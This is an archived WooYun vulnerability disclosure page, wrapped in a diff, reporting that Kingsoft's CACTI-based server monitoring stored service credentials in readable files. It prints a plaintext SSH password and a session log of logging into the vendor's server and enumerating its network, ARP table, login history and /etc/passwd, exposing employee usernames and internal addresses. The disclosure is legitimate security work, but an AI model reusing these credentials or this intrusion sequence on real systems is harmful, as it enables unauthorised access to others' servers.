@@ -1,0 +1,517 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		金山软件集团服务器监控服务存在高危安全隐患  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		金山软件集团服务器监控服务存在高危安全隐患  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/猪猪侠">猪猪侠</a> 
+</li><li>提交时间：		2012-04-16 16:34</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-04-16：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-04-17：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-04-27：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-05-07：	细节向普通白帽子公开<br/>
+									2012-05-17：	细节向实习白帽子公开<br/>
+									2012-05-31：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">金山软件集团为了对服务器进行实时监控，在服务器上自行开发部署了一套基于CACTI的监控服务，在部署时未考虑安全因素，存在多个严重安全威胁，可导致金山软件集团旗下服务器大面积黑客攻击。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">当骇客获取金山软件集团某台服务器权限后，查看服务器cron任务计划；<br />
+<br />
+</p><pre><code>SHELL=/bin/bash<br />
+PATH=/sbin:/bin:/usr/sbin:/usr/bin<br />
+MAILTO=root<br />
+HOME=/<br />
+<br />
+# run-parts<br />
+01 * * * * root  run-parts /opt/kingsoft/monitor/core/task/cron.hourly<br />
+02 4 * * * root  run-parts /opt/kingsoft/monitor/core/task/cron.daily<br />
+22 4 * * 0 root  run-parts /opt/kingsoft/monitor/core/task/cron.weekly<br />
+42 4 1 * * root  run-parts /opt/kingsoft/monitor/core/task/cron.monthly<br />
+03 * * * * root  run-parts /opt/kingsoft/monitor/core/task/cron<br />
+<br />
+#30 * * * * root rdate -s time-a.nist.gov<br />
+<br />
+35 3 * * * root sh /opt/kingsoft/monitor/core/cron/modifypassword.sh<br />
+<br />
+30 * * * * root /opt/kingsoft/monitor/core/cron/utctime.sh 00 /opt/kingsoft/monitor/core/cron/tasksleep.sh 120 /opt/kingsoft/monitor/core/taskdata/info_collection/script/info_collection_upload.sh<br />
+<br />
+*/15 * * * * root /opt/kingsoft/monitor/core/cron/update.sh &gt;&gt;/dev/null 2&gt;&amp;1</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+可发现kingsoft的monitore服务，均以文件方式存存储，且文件访问未做任何控制规则。<br />
+<br />
+导致多个系统服务密码泄露，严重影响被监控服务器。<br />
+<br />
+<br />
+<br />
+金山软件集团CACTI服务器：<br />
+<br />
+http://221.4.212.203/index.php </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">/opt/kingsoft/monitor/core/cron/cactirelease.sh<br />
+<br />
+</p><pre><code>#/bin/sh<br />
+#This Script is intelligent Cacti&#039;s MonitorScript.tar release Tool<br />
+<br />
+MonitorScriptPath=/opt/kingsoft/monitor<br />
+KingsoftHome=/opt/kingsoft<br />
+CrontFile=/etc/crontab<br />
+FtpHostChinatel=125.89.65.196<br />
+FtpHostIntranet=192.168.55.130<br />
+FtpHostCncnet=221.4.212.203<br />
+UserName=cacti****<br />
+PassWord=**********<br />
+GetFile=monitorbase<br />
+GetTar=monitordrelease.tar<br />
+ChinaTel=chinatelecom<br />
+CncNet=chinaunicom<br />
+Intranet=intranet<br />
+User=ftp_update_user.sh<br />
+updateCactiFile=main.sh<br />
+rsyncFile=update.sh</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code>[root@localhost ~]# ftp 221.4.212.203<br />
+Connected to 221.4.212.203.<br />
+220 Welcome into WOL FTP.<br />
+530 Please login with USER and PASS.<br />
+530 Please login with USER and PASS.<br />
+KERBEROS_V4 rejected as an authentication type<br />
+Name (221.4.212.203:root): cactirsync<br />
+331 Please specify the password.<br />
+Password:<br />
+230 Login successful.<br />
+Remote system type is UNIX.<br />
+Using binary mode to transfer files.<br />
+ftp&gt; ls<br />
+227 Entering Passive Mode (221,4,212,203,189,188)<br />
+150 Here comes the directory listing.<br />
+-rw-------    1 503      503       7180233 Jan 25  2010 2010-01-24.log.rar.gz<br />
+-rw-------    1 503      503       1376886 Jan 25  2010 2010-01-25.log.rar.gz<br />
+drwx------    2 503      503          4096 Oct 28  2008 22<br />
+-rw-------    1 503      503        939956 Feb 22  2010 7z465.exe<br />
+-rw-------    1 503      503      40093040 Oct 29  2008 DUBA080922_PACIFIC_48_202.exe<br />
+-rw-------    1 503      503       6181549 Feb 22  2010 FileZilla_3.3.2_win32.zip<br />
+drwx------    2 503      503          4096 Oct 27  2008 MagicSetbetadiy<br />
+-rw-------    1 503      503        892980 Aug 15  2010 RTX（腾讯通）企业内部通信平台.rar<br />
+-rw-------    1 503      503        465772 Jul 04  2011 S5120EI-BTM-107.btm<br />
+-rw-------    1 503      503       9119894 Jul 04  2011 S5120EI-CMW520-R2202P20-S168.bin<br />
+-rw-------    1 503      503        924880 Mar 15  2010 WinPcap_4_1_1.exe<br />
+-rw-------    1 503      503        618024 Oct 24  2008 Windows2000-KB958644-x86-CHS.EXE<br />
+-rw-------    1 503      503          3600 Mar 19  2010 cactirelease.sh<br />
+drwxr-xr-x    5 0        0           32768 Jan 20  2010 clientdata<br />
+-rw-------    1 503      503      12657950 Mar 15  2010 ethereal-setup-0.10.14.exe<br />
+-rw-------    1 503      503      20032944 Oct 29  2008 ftcsetup_huajun.zip<br />
+drwx------    5 503      503          4096 Aug 18  2009 gateway<br />
+-rw-------    1 503      503      16389120 Aug 18  2009 gateway-dx.tar<br />
+-rw-------    1 503      503         13705 May 12  2010 index.php<br />
+-rw-------    1 503      503        388381 Apr 23  2009 linsen@172.28.29.21<br />
+drwx------   11 503      503          4096 Apr 20  2010 monitor<br />
+-rw-------    1 503      503        572541 Jun 16  2009 monitor-windows.zip<br />
+-rw-------    1 503      503        535603 Apr 18  2010 monitor.rar<br />
+-rw-------    1 503      503        500166 Mar 16  2010 monitor.zip<br />
+-rw-------    1 503      503        679427 May 05  2010 monitor_221.23.zip<br />
+drwx------    2 503      503          4096 Aug 12  2008 monitor_new<br />
+-rw-------    1 503      503        557953 Apr 21  2010 monitor_windows_100420.zip<br />
+drwxr-xr-x    2 503      503          4096 Nov 19  2010 monitorbase<br />
+-rw-------    1 503      503        551275 Jun 10  2010 monitorwindows100610.zip<br />
+-rw-------    1 503      503          5213 Nov 19  2008 my.txt<br />
+drwx------    4 503      503          4096 Sep 01  2010 newcode<br />
+drwx------    2 503      503          4096 Apr 16  2010 nt<br />
+-rw-------    1 503      503      12046184 Nov 10  2008 php-5.2.6.tar.gz<br />
+-rw-------    1 503      503       4384117 Oct 10  2011 pq8.rar<br />
+-rw-------    1 503      503        465290 Apr 21  2009 pure-ftpd-1.0.21.tar.bz2<br />
+drwx------    9 503      503          4096 Aug 19  2009 queryapp<br />
+-rw-------    1 503      503        445062 Apr 20  2010 safecenter.zip<br />
+-rw-------    1 503      503      25170201 Apr 20  2011 stat_white.db-2011-03-30-61.136.58.29.gz<br />
+-rw-------    1 503      503        129996 Mar 09  2010 sysstat-5.0.5-25.el4.x86_64.rpm<br />
+drwx------    3 503      503          4096 Jan 13  2010 zhangwenbin<br />
+drwx------    2 503      503          4096 Jun 02  2009 天津小树林<br />
+drwx------    2 503      503          4096 Jun 02  2009 珠海IDC<br />
+-rw-------    1 503      503           763 Jul 05  2011 鍌叉父 3.lnk<br />
+drwx------    3 503      503          4096 Sep 01  2010 鏈懡鍚嶆枃浠跺す<br />
+226 Directory send OK.<br />
+ftp&gt; cd /monitor/configbase/cncconfig<br />
+250 Directory successfully changed.<br />
+ftp&gt; ls<br />
+227 Entering Passive Mode (221,4,212,203,219,54)<br />
+150 Here comes the directory listing.<br />
+-rw-------    1 503      503           192 Apr 20  2010 infoservers.cfg<br />
+-rw-------    1 503      503           195 Apr 20  2010 sftpservers.cfg<br />
+226 Directory send OK.<br />
+ftp&gt; get sftpservers.cfg<br />
+local: sftpservers.cfg remote: sftpservers.cfg<br />
+227 Entering Passive Mode (221,4,212,203,152,246)<br />
+150 Opening BINARY mode data connection for sftpservers.cfg (195 bytes).<br />
+226 File send OK.<br />
+195 bytes received in 2.6e-05 seconds (7.3e+03 Kbytes/s)<br />
+ftp&gt; quit<br />
+221 Goodbye.<br />
+[root@localhost ~]# cat sftpservers.cfg <br />
+c:\monitor\lib\monitor_psftp.exe -pw je2@J*9zg6wnfwjh32h3bf45b -bc -noagent -v -batch -b c:\monitor\config\common\sftpscript.cfg cactiuser@221.4.212.203 1&gt;c:\monitor\log\s221.4.212.203.log 2&gt;&amp;1<br />
+[root@localhost ~]# <br />
+[root@localhost ~]# ssh cactiuser@221.4.212.203<br />
+cactiuser@221.4.212.203&#039;s password: <br />
+Last login: Fri Feb 17 11:13:07 2012 from 27.154.32.246<br />
+[cactiuser@wol-monitor-svr ~]$ which ifconfig<br />
+/usr/bin/which: no ifconfig in (/usr/kerberos/bin:/usr/local/java/bin:/usr/local/java/jre/bin:/usr/local/bin:/bin:/usr/bin:/data/web/data/clientdata//bin)<br />
+[cactiuser@wol-monitor-svr ~]$ /sbin/ifconfig<br />
+eth0      Link encap:Ethernet  HWaddr B8:AC:6F:12:0A:6A  <br />
+          inet addr:10.20.220.13  Bcast:10.20.221.255  Mask:255.255.254.0<br />
+          inet6 addr: fe80::baac:6fff:fe12:a6a/64 Scope:Link<br />
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br />
+          RX packets:2531200998 errors:0 dropped:0 overruns:0 frame:0<br />
+          TX packets:2436331652 errors:0 dropped:0 overruns:0 carrier:0<br />
+          collisions:0 txqueuelen:1000 <br />
+          RX bytes:965258989840 (898.9 GiB)  TX bytes:405395637146 (377.5 GiB)<br />
+          Interrupt:90 Memory:d6000000-d6012100 <br />
+<br />
+eth1      Link encap:Ethernet  HWaddr B8:AC:6F:12:0A:6C  <br />
+          inet addr:10.20.216.5  Bcast:10.20.216.255  Mask:255.255.255.0<br />
+          inet6 addr: fe80::baac:6fff:fe12:a6c/64 Scope:Link<br />
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br />
+          RX packets:13898508 errors:0 dropped:0 overruns:0 frame:0<br />
+          TX packets:737578 errors:0 dropped:0 overruns:0 carrier:0<br />
+          collisions:0 txqueuelen:1000 <br />
+          RX bytes:2324752165 (2.1 GiB)  TX bytes:133218008 (127.0 MiB)<br />
+          Interrupt:98 Memory:d8000000-d8012100 <br />
+<br />
+lo        Link encap:Local Loopback  <br />
+          inet addr:127.0.0.1  Mask:255.0.0.0<br />
+          inet6 addr: ::1/128 Scope:Host<br />
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1<br />
+          RX packets:182264 errors:0 dropped:0 overruns:0 frame:0<br />
+          TX packets:182264 errors:0 dropped:0 overruns:0 carrier:0<br />
+          collisions:0 txqueuelen:0 <br />
+          RX bytes:20658245 (19.7 MiB)  TX bytes:20658245 (19.7 MiB)<br />
+<br />
+[cactiuser@wol-monitor-svr ~]$ arp -a<br />
+-bash: arp: command not found<br />
+[cactiuser@wol-monitor-svr ~]$ /sbin/arp<br />
+Address                  HWtype  HWaddress           Flags Mask            Iface<br />
+10.20.216.240            ether   00:15:17:25:4B:73   C                     eth1<br />
+doc.rdev.kingsoft.net    ether   00:50:56:A2:00:03   C                     eth0<br />
+10.20.220.224            ether   00:1E:0B:BF:80:34   C                     eth0<br />
+10.20.220.229            ether   00:24:E8:55:FB:16   C                     eth0<br />
+10.20.220.237            ether   00:30:48:D6:14:F0   C                     eth0<br />
+10.20.216.251            ether   98:4B:E1:6F:33:EC   C                     eth1<br />
+10.20.216.249            ether   00:24:8C:3C:C7:EB   C                     eth1<br />
+10.20.221.150            ether   00:10:5C:FA:F2:14   C                     eth0<br />
+dubabin.s.kingsoft.net   ether   00:21:5A:4E:D7:E8   C                     eth0<br />
+10.20.216.4              ether   00:22:19:64:43:F0   C                     eth1<br />
+10.20.221.222            ether   00:21:97:42:8C:0C   C                     eth0<br />
+10.20.220.238            ether   00:30:48:D6:14:D6   C                     eth0<br />
+10.20.220.225            ether   00:1E:0B:C0:09:0A   C                     eth0<br />
+10.20.221.226            ether   00:24:81:AA:9A:84   C                     eth0<br />
+10.20.220.242            ether   00:30:48:D6:14:9E   C                     eth0<br />
+cm.wol2.com              ether   00:26:B9:FC:96:38   C                     eth0<br />
+10.20.221.117            ether   00:1F:D0:0C:51:78   C                     eth0<br />
+10.20.216.14             ether   00:50:56:88:2A:5C   C                     eth1<br />
+10.20.220.233            ether   00:24:E8:59:32:7F   C                     eth0<br />
+10.20.221.215            ether   00:26:B9:44:E5:A2   C                     eth0<br />
+10.20.220.1              ether   00:0F:E2:C7:64:94   C                     eth0<br />
+10.20.221.12             ether   00:50:56:88:55:53   C                     eth0<br />
+10.20.220.236            ether   00:24:E8:4F:54:8D   C                     eth0<br />
+10.20.216.189            ether   00:18:71:68:70:DA   C                     eth1<br />
+10.20.216.246            ether   00:1F:C6:65:FB:31   C                     eth1<br />
+10.20.220.240            ether   00:30:48:D6:14:A0   C                     eth0<br />
+10.20.220.239            ether   00:30:48:D6:15:68   C                     eth0<br />
+10.20.216.150            ether   00:30:48:33:30:34   C                     eth1<br />
+10.20.220.223            ether   00:1E:0B:C0:09:EE   C                     eth0<br />
+10.20.221.115            ether   00:21:97:07:2E:4C   C                     eth0<br />
+10.20.221.26             ether   00:50:56:88:44:E7   C                     eth0<br />
+10.20.216.215            ether   00:1E:90:83:71:48   C                     eth1<br />
+10.20.216.198            ether   00:18:71:68:70:A6   C                     eth1<br />
+10.20.221.181            ether   00:1A:4B:AD:EC:7A   C                     eth0<br />
+10.20.220.222            ether   00:24:E8:54:51:60   C                     eth0<br />
+10.20.221.35             ether   00:18:71:68:70:34   C                     eth0<br />
+10.20.221.152            ether   00:30:48:35:01:78   C                     eth0<br />
+s.kingsoft.net           ether   00:50:56:88:18:27   C                     eth0<br />
+10.20.221.101            ether   00:1E:0B:BE:4D:E4   C                     eth0<br />
+10.20.216.18             ether   00:1E:90:83:73:24   C                     eth1<br />
+10.20.221.119            ether   00:23:54:8D:2D:98   C                     eth0<br />
+10.20.216.193            ether   00:18:71:68:64:48   C                     eth1<br />
+10.20.221.13             ether   00:50:56:88:5A:4A   C                     eth1<br />
+10.20.216.233            ether   00:16:EC:48:83:8C   C                     eth1<br />
+10.20.220.231            ether   00:24:E8:51:79:18   C                     eth0<br />
+10.20.216.244            ether   00:24:8C:3C:C7:E9   C                     eth1<br />
+10.20.216.231            ether   00:15:17:2C:5C:62   C                     eth1<br />
+10.20.221.24             ether   00:50:56:88:33:38   C                     eth0<br />
+10.20.220.235            ether   00:24:E8:51:9F:B0   C                     eth0<br />
+10.20.221.16             ether   00:14:C2:3A:FB:26   C                     eth0<br />
+trac.s.kingsoft.net      ether   00:1E:90:81:6E:A0   C                     eth0<br />
+res.rdev.kingsoft.net    ether   00:50:56:88:58:37   C                     eth0<br />
+dp2.wol2.com             ether   00:22:19:68:E6:5E   C                     eth0<br />
+10.20.221.89             ether   00:50:56:88:05:65   C                     eth0<br />
+10.20.220.230            ether   00:22:19:BF:82:37   C                     eth0<br />
+10.20.221.17             ether   00:50:56:88:2F:C9   C                     eth0<br />
+10.20.221.38             ether   00:50:56:4E:BA:29   C                     eth0<br />
+10.20.220.241            ether   00:30:48:D4:5E:AA   C                     eth0<br />
+10.20.220.253            ether   00:30:48:D6:14:CE   C                     eth0<br />
+10.20.216.151            ether   00:22:19:66:B1:CE   C                     eth1<br />
+10.20.216.209            ether   00:10:5C:CA:9C:74   C                     eth1<br />
+10.20.216.237            ether   D4:85:64:4C:32:AA   C                     eth1<br />
+10.20.220.232            ether   00:24:E8:4F:3F:D5   C                     eth0<br />
+10.20.221.45             ether   00:1E:8C:3A:AD:D8   C                     eth0<br />
+10.20.216.15             ether   00:50:56:88:7C:9B   C                     eth1<br />
+10.20.220.100            ether   98:4B:E1:6C:0A:16   C                     eth0<br />
+10.20.216.194            ether   00:18:71:68:70:12   C                     eth1<br />
+10.20.221.27             ether   00:24:E8:54:52:40   C                     eth0<br />
+10.20.220.243            ether   00:30:48:D6:13:80   C                     eth0<br />
+10.20.221.30             ether   00:50:56:88:02:6C   C                     eth0<br />
+10.20.216.246            ether   00:1F:C6:65:FB:31   C                     eth0<br />
+dp1.wol2.com             ether   00:22:19:69:5D:D9   C                     eth0<br />
+10.20.221.127            ether   00:1F:D0:0C:4F:7C   C                     eth0<br />
+10.20.216.185            ether   00:18:71:68:70:04   C                     eth1<br />
+10.20.216.196            ether   00:10:5C:FA:4D:7A   C                     eth1<br />
+10.20.221.15             ether   00:50:56:88:77:8B   C                     eth0<br />
+10.20.220.228            ether   00:24:E8:55:EB:57   C                     eth0<br />
+10.20.216.196            ether   00:10:5C:FA:4D:7A   C                     eth0<br />
+10.20.216.195            ether   00:18:71:68:64:30   C                     eth1<br />
+10.20.221.13             ether   00:50:56:88:5A:4A   C                     eth0<br />
+10.20.221.85             ether   00:50:56:88:78:01   C                     eth0<br />
+10.20.216.215            ether   00:1E:90:83:71:48   C                     eth0<br />
+10.20.216.217            ether   00:A0:D1:E0:78:E3   C                     eth1<br />
+10.20.220.234            ether   00:24:E8:51:7C:24   C                     eth0<br />
+10.20.220.227            ether   00:24:E8:59:32:01   C                     eth0<br />
+[cactiuser@wol-monitor-svr ~]$ last<br />
+cactiuse pts/0        59.39.*.*     Mon Apr 16 14:20   still logged in   <br />
+lijianhu pts/0        10.20.221.11     Fri Apr  6 15:45 - 18:55  (03:09)    <br />
+reboot   system boot  2.6.18-128.1.10. Fri Apr  6 15:13         (9+23:07)   <br />
+zhaohaij pts/1        10.20.221.11     Mon Apr  2 15:50 - 18:09 (1+02:19)   <br />
+zhaohaij pts/1        10.20.221.11     Mon Apr  2 15:38 - 15:50  (00:11)    <br />
+zhaohaij pts/1        10.20.221.11     Mon Apr  2 15:33 - 15:36  (00:03)    <br />
+wangxiao pts/1        10.20.221.11     Sun Apr  1 19:27 - 19:29  (00:02)    <br />
+wangxiao pts/1        10.20.221.11     Sun Apr  1 19:22 - 19:24  (00:01)    <br />
+wangxiao pts/1        10.20.221.11     Sun Apr  1 19:04 - 19:12  (00:08)    <br />
+wangxiao pts/1        10.20.221.11     Sun Apr  1 19:02 - 19:04  (00:01)    <br />
+wangxiao pts/2        10.20.221.11     Sun Apr  1 11:56 - 14:11  (02:14)    <br />
+wangxiao pts/1        10.20.221.11     Sun Apr  1 11:53 - 14:11  (02:17)    <br />
+wangxiao pts/1        10.20.221.11     Tue Mar 27 17:25 - 17:37  (00:11)    <br />
+lijianhu pts/1        10.20.221.11     Mon Mar 26 16:34 - 20:43  (04:09)    <br />
+wangxiao pts/1        10.20.221.11     Wed Mar 21 14:58 - 17:09  (02:11)    <br />
+xieyi    pts/1        10.20.221.11     Wed Mar 21 12:01 - 12:53  (00:52)    <br />
+lijianhu pts/1        10.20.221.11     Wed Mar 14 10:01 - 10:38  (00:36)    <br />
+zhaohaij pts/1        10.20.221.11     Wed Mar  7 15:57 - 16:01  (00:04)    <br />
+zhaohaij pts/2        10.20.221.11     Fri Mar  2 10:53 - 17:06  (06:12)    <br />
+liangxia pts/1        10.20.221.11     Fri Mar  2 10:24 - 18:16  (07:52)    <br />
+zhaohaij pts/1        10.20.221.11     Thu Mar  1 19:34 - 10:08  (14:33)    <br />
+liangxia pts/1        10.20.221.11     Thu Mar  1 17:09 - 18:01  (00:51)    <br />
+xieyi    pts/1        10.20.221.11     Thu Mar  1 14:45 - 15:02  (00:16)    <br />
+zhop     pts/1        10.20.188.177    Thu Mar  1 09:29 - 09:33  (00:03)    <br />
+liangxia pts/1        10.20.221.11     Tue Feb 28 10:11 - 10:26  (00:14)    <br />
+zhaohaij pts/1        10.20.221.11     Mon Feb 27 16:35 - 17:47  (01:11)    <br />
+zhaohaij pts/2        10.20.221.11     Mon Feb 27 16:34 - 16:35  (00:01)    <br />
+zhaohaij pts/1        10.20.221.11     Mon Feb 27 14:54 - 16:33  (01:39)    <br />
+zhop     pts/1        113.106.106.29   Mon Feb 27 10:40 - 11:54  (01:14)    <br />
+wangxiao pts/1        10.20.221.11     Fri Feb 24 20:30 - 20:32  (00:02)    <br />
+lijianhu pts/1        10.20.221.11     Thu Feb 23 22:22 - 23:25  (01:03)    <br />
+lijianhu pts/1        10.20.221.11     Thu Feb 23 14:31 - 14:31  (00:00)    <br />
+zhop     pts/2        202.105.182.222  Wed Feb 22 16:11 - 19:56  (03:45)    <br />
+zhop     pts/1        202.105.182.222  Wed Feb 22 16:08 - 19:56  (03:48)    <br />
+zhop     pts/1        202.105.182.222  Wed Feb 22 10:53 - 11:37  (00:43)    <br />
+zhaohaij pts/2        10.20.221.11     Sun Feb 19 19:45 - 21:35  (01:50)    <br />
+zhaohaij pts/2        125.89.65.194    Sun Feb 19 19:43 - 19:45  (00:01)    <br />
+zhaohaij pts/2        125.89.65.194    Sun Feb 19 19:43 - 19:43  (00:00)    <br />
+<br />
+wtmp begins Sun Feb 19 19:43:10 2012<br />
+[cactiuser@wol-monitor-svr ~]$ cat /etc/issue<br />
+CentOS release 5.3 (Final)<br />
+Kernel \r on an \m<br />
+<br />
+[cactiuser@wol-monitor-svr ~]$ cat /etc/passwd<br />
+root:x:0:0:root:/root:/bin/bash<br />
+bin:x:1:1:bin:/bin:/sbin/nologin<br />
+daemon:x:2:2:daemon:/sbin:/sbin/nologin<br />
+adm:x:3:4:adm:/var/adm:/sbin/nologin<br />
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin<br />
+sync:x:5:0:sync:/sbin:/bin/sync<br />
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown<br />
+halt:x:7:0:halt:/sbin:/sbin/halt<br />
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin<br />
+news:x:9:13:news:/etc/news:<br />
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin<br />
+operator:x:11:0:operator:/root:/sbin/nologin<br />
+games:x:12:100:games:/usr/games:/sbin/nologin<br />
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin<br />
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin<br />
+nobody:x:99:99:Nobody:/:/sbin/nologin<br />
+dbus:x:81:81:System message bus:/:/sbin/nologin<br />
+vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin<br />
+rpm:x:37:37::/var/lib/rpm:/sbin/nologin<br />
+haldaemon:x:68:68:HAL daemon:/:/sbin/nologin<br />
+netdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bash<br />
+nscd:x:28:28:NSCD Daemon:/:/sbin/nologin<br />
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin<br />
+rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin<br />
+mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin<br />
+smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin<br />
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin<br />
+nfsnobody:x:4294967294:4294967294:Anonymous NFS User:/var/lib/nfs:/sbin/nologin<br />
+pcap:x:77:77::/var/arpwatch:/sbin/nologin<br />
+xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin<br />
+pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin<br />
+htt:x:100:101:IIIMF Htt:/usr/lib64/im:/sbin/nologin<br />
+cactiuser:x:502:502::/data/web/data/clientdata/:/bin/bash<br />
+vsftpd:x:503:503::/home/vsftpd:/bin/bash<br />
+kautoadduser:x:512:512::/home/kautoadduser:/bin/bash<br />
+monitor:x:514:514::/home/monitor:/bin/bash<br />
+cactiuser1:x:518:518::/data/web/data/clientdata1:/bin/bash<br />
+ntp:x:38:38::/etc/ntp:/sbin/nologin<br />
+zhop:x:522:522::/home/zhop:/bin/bash<br />
+lijianhui:x:523:523::/home/lijianhui:/bin/bash<br />
+liaozhigang:x:525:525::/home/liaozhigang:/bin/bash<br />
+wangxiaozhou:x:526:526::/home/wangxiaozhou:/bin/bash<br />
+zhaoyiding:x:527:527::/home/zhaoyiding:/bin/bash<br />
+xieyi:x:528:528::/home/xieyi:/bin/bash<br />
+zhaohaijun:x:529:529::/home/zhaohaijun:/bin/bash<br />
+liangxiaocong:x:530:530::/home/liangxiaocong:/bin/bash<br />
+[cactiuser@wol-monitor-svr ~]$ exit<br />
+logout<br />
+Connection to 221.4.212.203 closed.</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">更新监控服务架构。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/猪猪侠" title="猪猪侠">猪猪侠</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-06112" title="金山软件集团服务器监控服务存在高危安全隐患">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2012-04-17 10:38</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">谢谢！我们马上进行修补！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="6112";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
